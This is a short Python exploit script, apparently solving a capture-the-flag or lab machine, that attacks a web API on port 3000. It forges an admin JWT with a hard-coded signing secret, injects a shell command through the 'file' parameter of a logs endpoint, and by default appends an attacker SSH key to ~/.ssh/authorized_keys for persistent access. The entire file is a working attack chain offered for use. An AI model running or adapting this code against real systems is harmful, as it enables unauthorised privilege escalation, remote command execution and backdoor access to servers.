import requests
import sys
import os
import jwt


def main(cmd):
    TOKEN_SECRET = "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE"
    URL = f"http://{os.environ['TARGET']}"

    session = requests.Session()

    register = session.post(f"{URL}:3000/api/user/register",
            json={"name": "andrew",
                "email": "andrew@example.com",
                "password": "foobar"})

    login = session.post(f"{URL}:3000/api/user/login",
            json={"email": "andrew@example.com",
                "password": "foobar"})

    secret_data = jwt.decode(login.text, TOKEN_SECRET)
    secret_data["name"] = "theadmin"

    session.headers.update({"auth-token": jwt.encode(secret_data, TOKEN_SECRET)})

    priv = session.get(f"{URL}:3000/api/priv")

    #print(priv.text)

    rce = session.get(f"{URL}:3000/api/logs", params={"file": f"&& {cmd}"})

    #output = rce.text.replace("\\n", "\n")
    output = "\n".join(rce.text.split("\\n")[3:])
    print(output)

if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else None
    if cmd is None:
        with open("attack.pub") as f:
            pubkey = f.read()

        cmd = f"whoami && echo {pubkey[:-1]} >> ~/.ssh/authorized_keys"
    main(cmd)
